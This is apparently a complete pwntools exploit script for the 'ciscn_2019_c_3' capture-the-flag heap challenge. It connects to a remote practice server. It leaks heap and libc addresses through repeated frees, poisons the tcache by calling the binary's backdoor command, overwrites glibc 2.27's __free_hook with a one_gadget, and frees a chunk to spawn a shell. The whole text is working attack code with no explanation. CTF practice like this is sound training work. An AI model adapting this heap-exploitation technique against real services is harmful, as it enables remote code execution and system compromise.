from pwn import *

#p = process('./ciscn_2019_c_3')
p = remote('node4.buuoj.cn', 27740)
libc = ELF('libc-2.27.buu.so')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.27/64/libc-2.27.debug.so
    ''' + s)

#0x60 0x100 0x4f
def alloc(size, content):
    sla(b'Command: ', b'1')
    sla(b'size: ', str(size).encode())
    sa(b'name', content)

def show(idx):
    sla(b'Command: ', b'2')
    sla(b'index: ', str(idx).encode())

def delete(idx):
    sla(b'Command: ', b'3')
    sla(b'weapon:', str(idx).encode())

def backdoor(idx):
    sla(b'Command: ', b'666')
    sla(b'weapon:', str(idx).encode())

alloc(0x100, b'a\n') #0
alloc(0x100, b'a\n') #1
alloc(0x60, b'a\n') #2
alloc(0x100, b'a\n') #3
alloc(0x100, b'a\n') #4
[delete(3) for i in range(7)]

show(3)
ru(b'attack_times: ')
heap_base = int(ru(b'\n')[:-1]) - 0x480 - 0x70
success('heap_base -> 0x%x' % heap_base)

delete(3)
show(3)
ru(b'attack_times: ')
libc_base = int(ru(b'\n')[:-1]) - 0x70 - libc.sym['__malloc_hook']
free_hook = libc_base + libc.sym['__free_hook']

one_gadgets = [0x4f365, 0x4f3c2, 0x10a45c]
one_gadgets_buu = [0x4f2c5, 0x4f322, 0x10a38c]
one = libc_base + one_gadgets_buu[1]

success('libc_base -> 0x%x' % libc_base)

delete(2)
delete(2)

[backdoor(2) for _ in range(0x60)]

alloc(0x60, b'a\n') #5
alloc(0x60, p64(free_hook - 0x10) + b'a\n') #6
alloc(0x100, b'/bin/sh\n') #7
alloc(0x100, p64(one) + b'\n') #8

delete(0)

p.interactive()